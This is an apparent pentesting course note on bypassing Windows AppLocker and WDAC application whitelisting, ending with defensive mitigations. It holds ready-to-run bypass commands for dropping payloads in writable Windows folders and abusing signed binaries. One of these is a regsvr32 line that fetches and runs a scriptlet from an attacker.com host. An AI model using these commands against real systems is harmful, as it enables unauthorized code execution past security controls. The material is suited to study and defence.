---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.35 AppLocker Bypass"
---

# AppLocker and WDAC Bypass

## Introduction
Application Whitelisting (AWL) is a powerful security control designed to prevent unauthorized software from executing on an endpoint. Instead of maintaining a list of known "bad" files (like traditional Antivirus), AWL maintains a list of "good" or "approved" files, blocking everything else. 

In Windows environments, the two primary implementations of AWL are **AppLocker** and **Windows Defender Application Control (WDAC)**. While highly effective, these controls are rarely implemented perfectly. Red teamers and penetration testers often seek to bypass these controls to execute malicious payloads, escalate privileges, or maintain persistence.

## Understanding the Defense

### AppLocker
Introduced in Windows 7, AppLocker allows administrators to create rules based on file attributes (path, publisher/signature, or file hash) to control which executables, scripts, Windows Installer files, and DLLs can run.
*   **Path Rules:** Allow execution from specific directories (e.g., `C:\Windows\*`).
*   **Publisher Rules:** Allow execution of files signed by a specific certificate (e.g., Microsoft Corporation).
*   **Hash Rules:** Allow execution based on the cryptographic hash of the file.

### Windows Defender Application Control (WDAC)
WDAC (formerly Device Guard) is a more modern, robust, and complex AWL solution introduced in Windows 10. It integrates deeply with the hypervisor (Virtualization-Based Security or VBS) and operates in the kernel, making it significantly harder to bypass than AppLocker, which operates primarily in userland.

## ASCII Architecture Diagram

```text
+---------------------------------------------------------------+
|                 Application Whitelisting Bypass Flow          |
|                                                               |
|   +----------------+           +----------------------+       |
|   |  Attacker      |           |  AppLocker / WDAC    |       |
|   |  Payload (.exe)|           |  Policy Enforcement  |       |
|   +-------+--------+           +----------+-----------+       |
|           |                               |                   |
|           |  Attempt Execution            |                   |
|           v                               v                   |
|   [ BLOCKED BY DEFAULT DENY ] <-----------+                   |
|                                                               |
|   +-------------------------------------------------------+   |
|   |                  Bypass Strategy                      |   |
|   | 1. Find a writable path allowed by rules.             |   |
|   | 2. Use a Trusted LOLBin (signed by MS).               |   |
|   | 3. Abuse misconfigured COM objects or DLL hijacking.  |   |
|   +---------------------------+---------------------------+   |
|                               |                               |
|                               v                               |
|   +----------------+   +-------------+    +---------------+   |
|   | Trusted LOLBin |   | Trusted Path|    | Payload Shell |   |
|   | (e.g., MSBuild)|-->| (C:\Windows\|--> | Execution     |   |
|   |                |   |  Tasks\)    |    |               |   |
|   +----------------+   +-------------+    +---------------+   |
|                                                               |
|                     [ SUCCESSFUL EXECUTION ]                  |
+---------------------------------------------------------------+
```

## Bypass Methodologies

Bypassing AppLocker/WDAC typically falls into several distinct categories: Path bypasses, LOLBin abuse, script host evasion, and COM/DLL hijacking.

### 1. Trusted Path Bypasses
The most common and easiest AppLocker misconfiguration is overly permissive Path Rules. By default, AppLocker allows execution from `C:\Windows\*` and `C:\Program Files\*` to ensure the OS and installed software function correctly.

However, several directories within `C:\Windows` are writable by standard unprivileged users. If an attacker drops an executable into one of these folders, they can run it, bypassing the AppLocker restriction.

**Common Writable Windows Directories:**
*   `C:\Windows\Tasks`
*   `C:\Windows\Temp`
*   `C:\Windows\System32\Spool\Drivers\color`
*   `C:\Windows\System32\Tasks`
*   `C:\Windows\Tracing`

*Exploitation:*
```cmd
copy payload.exe C:\Windows\Tasks\
cd C:\Windows\Tasks\
payload.exe
```

### 2. Living Off The Land Binaries (LOLBins)
If Path Rules are strictly locked down, attackers pivot to Publisher Rules. Since AppLocker usually allows any binary signed by Microsoft, attackers abuse legitimate Microsoft binaries (LOLBins) to execute arbitrary code. 

**Examples (See [[34 - LOLBins]] for deep details):**
*   **InstallUtil.exe:** Executes installer classes within .NET assemblies.
    ```cmd
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\payload.exe
    ```
*   **MSBuild.exe:** Compiles and executes C# code embedded in XML project files.
    ```cmd
    MSBuild.exe C:\temp\payload.xml
    ```
*   **Regsvr32.exe (Squiblydoo):** Executes COM scriptlets.
    ```cmd
    regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
    ```

### 3. PowerShell Constrained Language Mode (CLM) Bypass
When AppLocker is enabled, PowerShell automatically defaults to Constrained Language Mode (CLM) for unprivileged users. CLM severely restricts the types of PowerShell commands, preventing direct interaction with the .NET framework, COM objects, and Windows APIs.

**Bypassing CLM:**
*   **Downgrade Attack:** If older versions of PowerShell (e.g., v2) are installed, they do not support CLM.
    ```cmd
    powershell.exe -version 2
    ```
*   **Runspaces / Custom Hosts:** Attackers can write a custom C# executable (or use an allowed tool like MSBuild) to host a PowerShell Runspace. Because the runspace is instantiated within a non-powershell.exe process, it often defaults to Full Language Mode.

### 4. DLL Hijacking and COM Hijacking
If AppLocker restricts executables but fails to enforce DLL rules (which is common due to the performance overhead of validating every DLL load), attackers can use DLL Hijacking.

By placing a malicious DLL in a directory where a trusted application looks before it looks in the `System32` directory, the trusted application will load and execute the attacker's DLL. This achieves code execution within the context of the trusted (and allowed) application.

## Defensive Strategies & Mitigation

Securing Application Whitelisting requires a defense-in-depth approach.

1.  **Strict Path Rules:** Do not allow generic `C:\Windows\*` execution. Explicitly block execution from known writable subdirectories. Use the `accesschk.exe` tool from Sysinternals to audit directory permissions.
2.  **Block Known LOLBins:** Implement specific deny rules (often called a "blocklist") for common LOLBins like `MSBuild.exe`, `InstallUtil.exe`, `csc.exe`, `regsvr32.exe`, and `mshta.exe` unless explicitly required by a specific user group.
3.  **Enable DLL Enforcement:** While computationally expensive, enabling DLL rules in AppLocker or WDAC is critical to preventing DLL hijacking.
4.  **WDAC over AppLocker:** Migrate from AppLocker to WDAC. WDAC is significantly more robust against tampering and provides deeper OS integration.
5.  **Remove PowerShell v2:** Ensure PowerShell v2 feature is removed from the operating system to prevent downgrade attacks.
6.  **Continuous Auditing:** Regularly review Event Logs. AppLocker logs to `Microsoft-Windows-AppLocker/EXE and DLL`. Monitor for Event ID 8004 (blocked execution) and investigate the context.

## Chaining Opportunities
- AppLocker bypasses are a critical initial step for executing post-exploitation frameworks, leading to deeper AD enumeration [[25 - Active Directory Enumeration]].
- Successfully executing code via a LOLBin can bypass AppLocker and trigger [[37 - AMSI Bypass Techniques]] to execute advanced PowerShell payloads.
- Essential for establishing persistence before moving to [[33 - NTDS.dit Extraction]].

## Related Notes
- [[34 - LOLBins]]
- [[36 - Bypassing PowerShell Execution Policy]]
- [[10 - Windows Privilege Escalation Basics]]
- [[39 - Windows Defender Evasion Basics]]
